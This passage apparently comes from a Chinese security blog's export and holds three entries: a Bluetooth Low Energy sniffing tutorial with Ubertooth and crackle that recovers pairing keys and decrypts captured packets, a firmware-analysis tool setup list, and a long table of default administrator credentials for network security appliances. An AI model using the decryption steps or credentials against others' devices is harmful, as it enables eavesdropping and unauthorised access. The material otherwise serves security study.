<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ncurses-dev</span><br><span class="line">sudo apt-get install libpcap-dev</span><br><span class="line">sudo apt-get install libz-dev</span><br><span class="line">sudo apt-get install libmicrohttpd-dev</span><br><span class="line">sudo apt-get install libsqlite3-dev</span><br></pre></td></tr></table></figure>


</blockquote>
<p>找到kismet的配置文件kismet.conf ，把”pcapbtbb”加入到kismet.conf的logtypes= 里边</p>
<h3 id="6-安装BLE解密工具crackle"><a href="#6-安装BLE解密工具crackle" class="headerlink" title="6. 安装BLE解密工具crackle"></a>6. 安装BLE解密工具crackle</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;mikeryan&#x2F;crackle.git</span><br><span class="line">cd crackle</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h2 id="0x02-嗅探扫描"><a href="#0x02-嗅探扫描" class="headerlink" title="0x02 嗅探扫描"></a>0x02 嗅探扫描</h2><h3 id="1-Spectool"><a href="#1-Spectool" class="headerlink" title="1. Spectool"></a>1. Spectool</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install spectools</span><br></pre></td></tr></table></figure>

<h4 id="a-spectool-curses"><a href="#a-spectool-curses" class="headerlink" title="a. spectool_curses"></a>a. spectool_curses</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015092657632.png" alt="image-20201015092657632"></p>
<h4 id="b-spectool-gtk"><a href="#b-spectool-gtk" class="headerlink" title="b. spectool_gtk"></a>b. spectool_gtk</h4><p>扫描附近信号在频谱上显示</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015093808357.png" alt="image-20201015093808357"></p>
<h4 id="c-spectool-raw"><a href="#c-spectool-raw" class="headerlink" title="c. spectool_raw"></a>c. spectool_raw</h4><p>RAW中文的解释是“原材料”或“未经过处理的东西”，这里猜测是显示设备捕获到的未经处理的信号数据：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015094038013.png" alt="image-20201015094038013"></p>
<h4 id="d-spectool-net"><a href="#d-spectool-net" class="headerlink" title="d. spectool_net"></a>d. spectool_net</h4><p>将Ubertooth One作为一台“硬件服务器”，并监听TCP：30569端口，局域网内任何可以跟主机建立通信的PC可通过Ubertoothe主机IP+30569共享设备。连接方式：在另外一台主机终端上执行：spectool_gtk</p>
<p>—&gt;选择Open Network Device —&gt;输入ip、端口</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015094733056.png" alt="image-20201015094733056"></p>
<h3 id="2-Hcitool"><a href="#2-Hcitool" class="headerlink" title="2. Hcitool"></a>2. Hcitool</h3><p>hcitool –help</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hcitool - HCI Tool ver 5.48</span><br><span class="line">Usage:</span><br><span class="line">	hcitool [options] &lt;command&gt; [command parameters]</span><br><span class="line">Options:</span><br><span class="line">	--help	Display help</span><br><span class="line">	-i dev	HCI device</span><br><span class="line">Commands:</span><br><span class="line">	dev 	Display local devices</span><br><span class="line">	inq 	Inquire remote devices</span><br><span class="line">	scan	Scan for remote devices</span><br><span class="line">	name	Get name from remote device</span><br><span class="line">	info	Get information from remote device</span><br><span class="line">	spinq	Start periodic inquiry</span><br><span class="line">	epinq	Exit periodic inquiry</span><br><span class="line">	cmd 	Submit arbitrary HCI commands</span><br><span class="line">	con 	Display active connections</span><br><span class="line">	cc  	Create connection to remote device</span><br><span class="line">	dc  	Disconnect from remote device</span><br><span class="line">	sr  	Switch master&#x2F;slave role</span><br><span class="line">	cpt 	Change connection packet type</span><br><span class="line">	rssi	Display connection RSSI</span><br><span class="line">	lq  	Display link quality</span><br><span class="line">	tpl 	Display transmit power level</span><br><span class="line">	afh 	Display AFH channel map</span><br><span class="line">	lp  	Set&#x2F;display link policy settings</span><br><span class="line">	lst 	Set&#x2F;display link supervision timeout</span><br><span class="line">	auth	Request authentication</span><br><span class="line">	enc 	Set connection encryption</span><br><span class="line">	key 	Change connection link key</span><br><span class="line">	clkoff	Read clock offset</span><br><span class="line">	clock	Read local or remote clock</span><br><span class="line">	lescan	Start LE scan</span><br><span class="line">	leinfo	Get LE remote information</span><br><span class="line">	lewladd	Add device to LE White List</span><br><span class="line">	lewlrm	Remove device from LE White List</span><br><span class="line">	lewlsz	Read size of LE White List</span><br><span class="line">	lewlclr	Clear LE White List</span><br><span class="line">	lerladd	Add device to LE Resolving List</span><br><span class="line">	lerlrm	Remove device from LE Resolving List</span><br><span class="line">	lerlclr	Clear LE Resolving List</span><br><span class="line">	lerlsz	Read size of LE Resolving List</span><br><span class="line">	lerlon	Enable LE Address Resolution</span><br><span class="line">	lerloff	Disable LE Address Resolution</span><br><span class="line">	lecc	Create a LE Connection</span><br><span class="line">	ledc	Disconnect a LE Connection</span><br><span class="line">	lecup	LE Connection Update</span><br><span class="line"></span><br><span class="line">For more information on the usage of each command use:</span><br><span class="line">	hcitool &lt;command&gt; --help</span><br></pre></td></tr></table></figure>

<p>hcitool scan :扫描附近蓝牙设备</p>
<p>hcitool lescan :扫描附近低功耗蓝牙设备</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015095601031.png" alt="image-20201015095601031"></p>
<h3 id="3-Gatttool"><a href="#3-Gatttool" class="headerlink" title="3. Gatttool"></a>3. Gatttool</h3><p> gatttool -h</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  gatttool [OPTION?]</span><br><span class="line"></span><br><span class="line">Help Options:</span><br><span class="line">  -h, --help                                Show help options</span><br><span class="line">  --help-all                                Show all help options</span><br><span class="line">  --help-gatt                               Show all GATT commands</span><br><span class="line">  --help-params                             Show all Primary Services&#x2F;Characteristics arguments</span><br><span class="line">  --help-char-read-write                    Show all Characteristics Value&#x2F;Descriptor Read&#x2F;Write arguments</span><br><span class="line"></span><br><span class="line">Application Options:</span><br><span class="line">  -i, --adapter&#x3D;hciX                        Specify local adapter interface</span><br><span class="line">  -b, --device&#x3D;MAC                          Specify remote Bluetooth address</span><br><span class="line">  -t, --addr-type&#x3D;[public | random]         Set LE address type. Default: public</span><br><span class="line">  -m, --mtu&#x3D;MTU                             Specify the MTU size</span><br><span class="line">  -p, --psm&#x3D;PSM                             Specify the PSM for GATT&#x2F;ATT over BR&#x2F;EDR</span><br><span class="line">  -l, --sec-level&#x3D;[low | medium | high]     Set security level. Default: low</span><br><span class="line">  -I, --interactive                         Use interactive mode</span><br></pre></td></tr></table></figure>

<p>gatttool -b EC:F3:42:B2:DF:24 -I</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015100005087.png" alt="image-20201015100005087"></p>
<h3 id="4-Ubertooth-scan-s"><a href="#4-Ubertooth-scan-s" class="headerlink" title="4. Ubertooth-scan -s"></a>4. Ubertooth-scan -s</h3><p>sudo apt install ubertooth</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015104856092.png" alt="image-20201015104856092"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015104915904.png" alt="image-20201015104915904"></p>
<h3 id="5-Ubertooth-ble"><a href="#5-Ubertooth-ble" class="headerlink" title="5. Ubertooth-ble"></a>5. Ubertooth-ble</h3><pre><code>ubertooth-btle - passive Bluetooth Low Energy monitoring
Usage:
    -h this help

    Major modes:
    -f follow connections
    -p promiscuous: sniff active connections
    -a[address] get/set access address (example: -a8e89bed6)
    -s&lt;address&gt; faux slave mode, using MAC addr (example: -s22:44:66:88:aa:cc)
    -t&lt;address&gt; set connection following target (example: -t22:44:66:88:aa:cc)

    Interference (use with -f or -p):
    -i interfere with one connection and return to idle
    -I interfere continuously

    Data source:
    -U&lt;0-7&gt; set ubertooth device to use

    Misc:
    -r&lt;filename&gt; capture packets to PCAPNG file
    -q&lt;filename&gt; capture packets to PCAP file (DLT_BLUETOOTH_LE_LL_WITH_PHDR)
    -c&lt;filename&gt; capture packets to PCAP file (DLT_PPI)
    -A&lt;index&gt; advertising channel index (default 37)
    -v[01] verify CRC mode, get status or enable/disable
    -x&lt;n&gt; allow n access address offenses (default 32)

If an input file is not specified, an Ubertooth device is used for live capture.
In get/set mode no capture occurs.</code></pre><blockquote>
<p>ubertooth-btle -f -c test.pcap抓包&amp;保存到本地</p>
</blockquote>
<p>使用这条命令我们可以把设备捕获到的数据包保存到本地，完成后可导入wireshark进行数据包、协议分析。</p>
<p>wireshark导入嗅探到的蓝牙数据包需要处理一下才能正常查看，不然无法正常分析数据：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015113803864.png" alt="image-20201015113803864"></p>
<p>Edit → Preferences → Protocols → DLT_USER → Edit → New</p>
<p>在payload protocol中输入btle</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015110349788.png" alt="image-20201015110349788"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015113903595.png" alt="image-20201015113903595"></p>
<p>使用规则过滤数据包：参考<a href="https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark">Capturing BLE in Wireshark</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">btle.data_header.length &gt; 0 || btle.advertising_header.pdu_type &#x3D;&#x3D; 0x05</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015114932731.png" alt="image-20201015114932731"></p>
<h3 id="6-crackle"><a href="#6-crackle" class="headerlink" title="6. crackle"></a>6. crackle</h3><p>如果捕获到足够的数据包尤其是btsmp，抓到包之后我们最关心的问题是我们有没有抓到的足够的包来破解tk。所以在wireshark中你可以在filter处加上btsmp，确保抓到了我们需要的6个包。，那接下来便可以用crackle来破解tk和ltk：</p>
<p><strong>做到这个点尝试了身边的一些设备的连接没抓到大量包没有至少6个btsmp之后实践中碰到补足图片</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackle -i &lt;file.pcap&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015115144837.png" alt="image-20201015115144837"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">从上图中我们可以看到我们不但破解了tk，还利用利用tk和其它一些数据成功的还原出了ltk。</span><br><span class="line"></span><br><span class="line">接下来我们再来试试利用获取的ltk来破解其他的加密包。假设我们在配对过程中已经拿到了ltk&#x3D;7f62c053f104a5bbe68b1d896a2ed49c</span><br></pre></td></tr></table></figure>

<p>解密数据包，并把解密后的包另存：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackle -i &lt;file.pcap&gt; -o &lt;output.pcap&gt;</span><br><span class="line">crackle -i &lt;file.pcap&gt; -o &lt;out.pcap&gt; -l &lt;ltk&gt;</span><br><span class="line"></span><br><span class="line">crackle -l 7f62c053f104a5bbe68b1d896a2ed49c -i test44.pcap -o test66.pcap</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015115842434.png" alt="image-20201015115842434"></p>
<p>可以看到成功破解了7个包</p>
<h2 id="0x03-解决方案"><a href="#0x03-解决方案" class="headerlink" title="0x03 解决方案"></a>0x03 解决方案</h2><h4 id="1-使用OOB"><a href="#1-使用OOB" class="headerlink" title="1. 使用OOB"></a>1. 使用OOB</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[email protected]:~&#x2F;Desktop# crackle -i heart.pcap </span><br><span class="line">Warning: No output file specified. Won&#39;t decrypt any packets.</span><br><span class="line">Warning: found multiple connects, only using the latest one</span><br><span class="line">Warning: found multiple LL_ENC_REQ, only using latest one</span><br><span class="line">Warning: found multiple connects, only using the latest one</span><br><span class="line">Warning: found multiple pairing requests, only using the latest one</span><br><span class="line">Warning: found multiple connects, only using the latest one</span><br><span class="line">Warning: found multiple pairing requests, only using the latest one</span><br><span class="line">Warning: already saw two random values, skipping</span><br><span class="line">Warning: found multiple LL_ENC_REQ, only using latest one</span><br><span class="line">TK not found, the connection is probably using OOB pairing</span><br><span class="line">Sorry d00d :(</span><br></pre></td></tr></table></figure>

<h4 id="2-支持bluetooth4-2以上的设备的出现（通过ECDH解决）"><a href="#2-支持bluetooth4-2以上的设备的出现（通过ECDH解决）" class="headerlink" title="2. 支持bluetooth4.2以上的设备的出现（通过ECDH解决）"></a>2. 支持bluetooth4.2以上的设备的出现（通过ECDH解决）</h4><h2 id="0x04-参考："><a href="#0x04-参考：" class="headerlink" title="0x04 参考："></a>0x04 参考：</h2><p><a href="http://www.vuln.cn/6083">http://www.vuln.cn/6083</a></p>
<p><a href="https://blog.csdn.net/charmve/article/details/107170250">https://blog.csdn.net/charmve/article/details/107170250</a></p>
<p><a href="https://www.freebuf.com/articles/wireless/106298.html">路人甲@乌云drops:Bluetooth Low Energy 嗅探</a></p>
<p><a href="http://j2abro.blogspot.com.au/2014/06/understanding-bluetooth-advertising.html">疯狗@乌云drops：物联网安全拔“牙”实战——低功耗蓝牙（BLE）初探</a></p>
<p><a href="https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide">https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide</a></p>
<p><a href="https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark">https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark</a></p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>BLE</tag>
        <tag>Ubertooth one</tag>
        <tag>SDK</tag>
      </tags>
  </entry>
  <entry>
    <title>固件环境搭建</title>
    <url>/2020/09/12/IOT/%E5%9B%BA%E4%BB%B6%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://gitee.com/h4lo1/HatLab_Tools_Library">https://gitee.com/h4lo1/HatLab_Tools_Library</a></p>
<a id="more"></a>

<h3 id="binwalk："><a href="#binwalk：" class="headerlink" title="binwalk："></a>binwalk：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;devttys0&#x2F;binwalk.git</span><br><span class="line">cd binwalk</span><br><span class="line">sudo .&#x2F;deps.sh</span><br><span class="line">sudo python .&#x2F;setup.py install</span><br><span class="line">sudo apt-get install python-lzma</span><br><span class="line">sudo -H pip install git+https:&#x2F;&#x2F;github.com&#x2F;ahupp&#x2F;python-magic</span><br><span class="line">sudo -H pip install git+https:&#x2F;&#x2F;github.com&#x2F;sviehb&#x2F;jefferson</span><br></pre></td></tr></table></figure>

<h3 id="firmadyne："><a href="#firmadyne：" class="headerlink" title="firmadyne："></a>firmadyne：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;firmadyne&#x2F;firmadyne</span><br><span class="line">cd firmadyne&#x2F; &amp;&amp; sudo download.sh</span><br><span class="line">sudo -u postgres createuser -P firmadyne    password: firmadyne</span><br><span class="line">	 </span><br><span class="line">sudo -u postgres createdb -O firmadyne firmware</span><br><span class="line">sudo -u postgres psql -d firmware &lt; .&#x2F;firmadyne&#x2F;database&#x2F;schema</span><br></pre></td></tr></table></figure>

<h3 id="qemu-2-4-0"><a href="#qemu-2-4-0" class="headerlink" title="qemu-2.4.0:"></a>qemu-2.4.0:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;download.qemu.org&#x2F;qemu-2.4.0.tar.xz</span><br><span class="line">tar xvf qemu-2.4.0.tar.xz &amp;&amp; cd qemu-2.4.0&#x2F;</span><br><span class="line">.&#x2F;configure --target-list&#x3D;arm-softmmu,mips-softmmu,mipsel-softmmu --audio-drv-list&#x3D;alsa,pa</span><br><span class="line">make -j8</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h3 id="gdb-multiarch"><a href="#gdb-multiarch" class="headerlink" title="gdb-multiarch:"></a>gdb-multiarch:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure>

<h3 id="gdbserver"><a href="#gdbserver" class="headerlink" title="gdbserver:"></a>gdbserver:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;hugsy&#x2F;gdb-static</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;akpotter&#x2F;embedded-toolkit</span><br></pre></td></tr></table></figure>

<h3 id="IDA-脚本"><a href="#IDA-脚本" class="headerlink" title="IDA 脚本"></a>IDA 脚本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;giantbranch&#x2F;mipsAudit</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tigerpuma&#x2F;idatool-devttys0-</span><br></pre></td></tr></table></figure>

<h2 id="Ghidra"><a href="#Ghidra" class="headerlink" title="Ghidra"></a>Ghidra</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.nsa.gov&#x2F;resources&#x2F;everyone&#x2F;ghidra&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="cutter"><a href="#cutter" class="headerlink" title="cutter"></a>cutter</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;radareorg&#x2F;cutter</span><br></pre></td></tr></table></figure>

<h3 id="qemu-system-arm"><a href="#qemu-system-arm" class="headerlink" title="qemu_system_arm"></a>qemu_system_arm</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;people.debian.org&#x2F;~aurel32&#x2F;qemu&#x2F;armhf&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="firmwalker"><a href="#firmwalker" class="headerlink" title="firmwalker"></a>firmwalker</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;craigz28&#x2F;firmwalker</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>iot</tag>
      </tags>
  </entry>
  <entry>
    <title>默认设备密码</title>
    <url>/2020/09/12/IOT/%E9%BB%98%E8%AE%A4%E8%AE%BE%E5%A4%87%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h2 id="设备默认密码"><a href="#设备默认密码" class="headerlink" title="设备默认密码"></a>设备默认密码</h2><a id="more"></a>

<table>
<thead>
<tr>
<th align="center">设备</th>
<th align="center">默认账号</th>
<th align="center">默认密码</th>
</tr>
</thead>
<tbody><tr>
<td align="center">深信服产品</td>
<td align="center">sangfor</td>
<td align="center">sangfor/sangfor@2018/sangfor@2019</td>
</tr>
<tr>
<td align="center">深信服科技AD</td>
<td align="center">sangfor</td>
<td align="center">dlanrecover</td>
</tr>
<tr>
<td align="center">深信服负载均衡 AD 3.6</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">深信服WAC（WNS V2.6）</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">深信服v-p-n</td>
<td align="center">Admin</td>
<td align="center">Admin</td>
</tr>
<tr>
<td align="center">深信服-ipsec-V-P-N（SSL 5.5）</td>
<td align="center">Admin</td>
<td align="center">Admin</td>
</tr>
<tr>
<td align="center">深信服AC6.0</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">SANGFOR防火墙</td>
<td align="center">admin</td>
<td align="center">sangfor</td>
</tr>
<tr>
<td align="center">深信服AF（NGAF V2.2）</td>
<td align="center">admin</td>
<td align="center">sangfor</td>
</tr>
<tr>
<td align="center">深信服NGAF下一代应用防火墙（NGAF V4.3）</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">深信服AD3.9</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">深信服上网行为管理设备数据中心</td>
<td align="center">Admin</td>
<td align="center">密码为空</td>
</tr>
<tr>
<td align="center">SANGFOR_AD_v5.1</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">网御漏洞扫描系统</td>
<td align="center">leadsec</td>
<td align="center">leadsec</td>
</tr>
<tr>
<td align="center">天闻入侵检测和管理系统V7.0</td>
<td align="center">Admin</td>
<td align="center">venus70</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">Audit</td>
<td align="center">venus70</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">adm</td>
<td align="center">venus70</td>
</tr>
<tr>
<td align="center">天闻入侵检测和管理系统V6.0</td>
<td align="center">Admin</td>
<td align="center">venus60</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">Audit</td>
<td align="center">venus60</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">adm</td>
<td align="center">venus60</td>
</tr>
<tr>
<td align="center">网御WAF集中控制中心（V3.0R5.0）</td>
<td align="center">admin</td>
<td align="center">leadsec.waf</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">audit</td>
<td align="center">leadsec.waf</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">adm</td>
<td align="center">leadsec.waf</td>
</tr>
<tr>
<td align="center">联想网御</td>
<td align="center">administrator</td>
<td align="center">administrator</td>
</tr>
<tr>
<td align="center">网御事件服务器</td>
<td align="center">admin</td>
<td align="center">admin123</td>
</tr>
<tr>
<td align="center">联想网御入侵检测系统v3.2.72.0</td>
<td align="center">adm</td>
<td align="center">leadsec32</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">admin</td>
<td align="center">leadsec32</td>
</tr>
<tr>
<td align="center">联想网御防火墙PowerV</td>
<td align="center">administrator</td>
<td align="center">administrator</td>
</tr>
<tr>
<td align="center">联想网御入侵检测系统</td>
<td align="center">lenovo</td>
<td align="center">default</td>
</tr>
<tr>
<td align="center">网络卫视入侵检测系统</td>
<td align="center">admin</td>
<td align="center">talent</td>
</tr>
<tr>
<td align="center">联想网御入侵检测系统IDS</td>
<td align="center">root</td>
<td align="center">111111</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">admin</td>
<td align="center">admin123</td>
</tr>
<tr>
<td align="center">科来网络回溯分析系统</td>
<td align="center">csadmin</td>
<td align="center">colasoft</td>
</tr>
<tr>
<td align="center">中控考勤机web3.0</td>
<td align="center">administrator</td>
<td align="center">123456</td>
</tr>
<tr>
<td align="center">H3C IMC</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">H3C SecPath系列</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">H3C S520-SI</td>
<td align="center">test</td>
<td align="center">123</td>
</tr>
<tr>
<td align="center">H3C 智能管理中心</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">H3C RE3100</td>
<td align="center">admin</td>
<td align="center">adminer3100</td>
</tr>
<tr>
<td align="center">H3C RE3200</td>
<td align="center">admin</td>
<td align="center">adminer3200</td>
</tr>
<tr>
<td align="center">H3C RE3260</td>
<td align="center">admin</td>
<td align="center">adminer3260</td>
</tr>
<tr>
<td align="center">H3C</td>
<td align="center">admin</td>
<td align="center">adminer</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">admin</td>
<td align="center">h3capadmin</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">h3c</td>
<td align="center">h3c</td>
</tr>
<tr>
<td align="center">360天擎</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">网神防火墙</td>
<td align="center">firewall</td>
<td align="center">firewall</td>
</tr>
<tr>
<td align="center">天融信防火墙NGFW4000</td>
<td align="center">superman</td>
<td align="center">talent</td>
</tr>
<tr>
<td align="center">黑盾防火墙</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">rule</td>
<td align="center">abc123</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">audit</td>
<td align="center">abc123</td>
</tr>
<tr>
<td align="center">华为防火墙</td>
<td align="center">telnetuser</td>
<td align="center">telnetpwd</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">ftpuser</td>
<td align="center">ftppwd</td>
</tr>
<tr>
<td align="center">方正防火墙</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">飞塔防火墙</td>
<td align="center">admin</td>
<td align="center">密码为空</td>
</tr>
<tr>
<td align="center">Juniper_SSG_5防火墙</td>
<td align="center">netscreen</td>
<td align="center">netscreen</td>
</tr>
<tr>
<td align="center">中新金盾硬件防火墙</td>
<td align="center">admin</td>
<td align="center">123</td>
</tr>
<tr>
<td align="center">kill防火墙（冠群金辰）</td>
<td align="center">admin</td>
<td align="center">sys123</td>
</tr>
<tr>
<td align="center">天清汉马USG防火墙</td>
<td align="center">admin</td>
<td align="center">venus.fw</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">Audit</td>
<td align="center">venus.audit</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">useradmin</td>
<td align="center">venus.user</td>
</tr>
<tr>
<td align="center">阿姆瑞特防火墙</td>
<td align="center">admin</td>
<td align="center">manager</td>
</tr>
<tr>
<td align="center">山石网科</td>
<td align="center">hillstone</td>
<td align="center">hillstone</td>
</tr>
<tr>
<td align="center">绿盟安全审计系统</td>
<td align="center">weboper</td>
<td align="center">weboper</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">webaudit</td>
<td align="center">webaudit</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">conadmin</td>
<td align="center">conadmin</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">shell</td>
<td align="center">shell</td>
</tr>
<tr>
<td align="center">绿盟产品</td>
<td align="center"></td>
<td align="center">nsfocus123</td>
</tr>
<tr>
<td align="center">TopAudit日志审计系统</td>
<td align="center">superman</td>
<td align="center">talent</td>
</tr>
<tr>
<td align="center">LogBase日志管理综合审计系统</td>
<td align="center">admin</td>
<td align="center">safetybase</td>
</tr>
<tr>
<td align="center">网神SecFox韵味安全管理与审计系统</td>
<td align="center">admin</td>
<td align="center">!1fw@2soc#3v-p-n</td>
</tr>
<tr>
<td align="center">天融信数据库审计系统</td>
<td align="center">superman</td>
<td align="center">telent</td>
</tr>
<tr>
<td align="center">Hillstone安全审计平台</td>
<td align="center">hillstone</td>
<td align="center">hillstone</td>
</tr>
<tr>
<td align="center">网康日志中心</td>
<td align="center">ns25000</td>
<td align="center">ns25000</td>
</tr>
<tr>
<td align="center">网络安全审计系统（中科新业）</td>
<td align="center">admin</td>
<td align="center">123456</td>
</tr>
<tr>
<td align="center">天玥网络安全审计系统</td>
<td align="center">Admin</td>
<td align="center">cyberaudit</td>
</tr>
<tr>
<td align="center">明御WEB应用防火墙</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">admin</td>
<td align="center">adminadmin</td>
</tr>
<tr>
<td align="center">明御攻防实验室平台</td>
<td align="center">root</td>
<td align="center">123456</td>
</tr>
<tr>
<td align="center">明御安全网关</td>
<td align="center">admin</td>
<td align="center">adminadmin</td>
</tr>
<tr>
<td align="center">明御运维审计与册风险控制系统</td>
<td align="center">admin</td>
<td align="center">1q2w3e</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">system</td>
<td align="center">1q2w3e4r</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">auditor</td>
<td align="center">1q2w3e4r</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">operator</td>
<td align="center">1q2w3e4r</td>
</tr>
<tr>
<td align="center">明御网站卫士</td>
<td align="center">sysmanager</td>
<td align="center">sysmanager888</td>
</tr>
<tr>
<td align="center">亿邮邮件网关</td>
<td align="center">eyouuser</td>
<td align="center">eyou_admin</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">eyougw</td>
<td align="center">admin@(eyou)</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">admin</td>
<td align="center">+ccccc</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">admin</td>
<td align="center">cyouadmin</td>
</tr>
<tr>
<td align="center">Websense邮件安全网关</td>
<td align="center">administrator</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">梭子鱼邮件存储网关</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">天行光闸</td>
<td align="center">super</td>
<td align="center">TopFGAP123</td>
</tr>
<tr>
<td align="center">天行光闸</td>
<td align="center">admin</td>
<td align="center">Topwalkadmin123</td>
</tr>
<tr>
<td align="center">天融信防火墙</td>
<td align="center">superman</td>
<td align="center">talent!23</td>
</tr>
<tr>
<td align="center">联想网御防火墙</td>
<td align="center">admin</td>
<td align="center">eadsec@7766/administrator/bane@7766</td>
</tr>
<tr>
<td align="center">深信服防火墙</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">启明星辰</td>
<td align="center">admin</td>
<td align="center">bane@7766</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center">admin@123</td>
</tr>
<tr>
<td align="center">juniper</td>
<td align="center">netscreen</td>
<td align="center">netscreen</td>
</tr>
<tr>
<td align="center">Cisco</td>
<td align="center">admin</td>
<td align="center">cisco</td>
</tr>
<tr>
